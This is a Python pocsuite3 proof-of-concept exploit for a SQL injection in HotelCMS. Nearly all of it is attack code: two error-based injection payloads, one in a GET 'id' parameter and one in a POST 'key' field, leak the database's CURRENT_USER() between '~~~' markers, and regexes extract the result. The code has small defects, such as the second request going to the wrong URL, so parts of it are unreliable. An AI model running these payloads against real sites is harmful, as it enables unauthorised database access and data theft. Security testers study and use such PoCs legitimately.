#!/usr/bin/env python

# coding: utf-8
import re

from pocsuite3.api import Output, POCBase, register_poc, requests


class TestPOC(POCBase):
	vulID = 'SSV:91873'  # ssvid
	version = '2.0'
	author = ['kenan', "dmknght"]
	vulDate = '2016-06-06'
	createDate = '2016-06-06'
	updateDate = '2016-06-06'
	references = ['http://www.seebug.org/vuldb/ssvid-']
	name = 'BookingeCMS HotelCMS SQL Injection'
	appPowerLink = ''
	appName = 'HotelCMS'
	appVersion = ''
	vulType = ''
	desc = '''
    '''
	samples = ['']
	install_requires = ['']
	
	def _attack(self):
		result = {}
		# Write your code here
		vulurl = "%s" % self.url
		payload = "/?m=info.detail&id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
		resp = requests.get(vulurl + payload)
		re_result = re.findall(r'~~~(.*?)~~~', resp.content, re.S | re.I)
		vulurl1 = "%s/?m=city.getSearch&index=xx" % self.url
		payload1 = {
			"key": "xxx' AND (SELECT 7359 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xx'='xx"}
		resp1 = requests.post(vulurl, data = payload1)
		re_result1 = re.findall(r'~~~(.*?)~~~', resp1.content, re.S | re.I)
		if re_result:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = vulurl
			result['VerifyInfo']['Payload'] = payload
			return self.parse_output(result)
		if re_result1:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = vulurl1
			result['VerifyInfo']['Payload'] = payload1
			return self.parse_output(result)
	
	def _verify(self):
		result = {}
		return self._attack()
	
	def parse_output(self, result):
		# parse output
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Internet nothing returned')
		return output


register_poc(TestPOC)
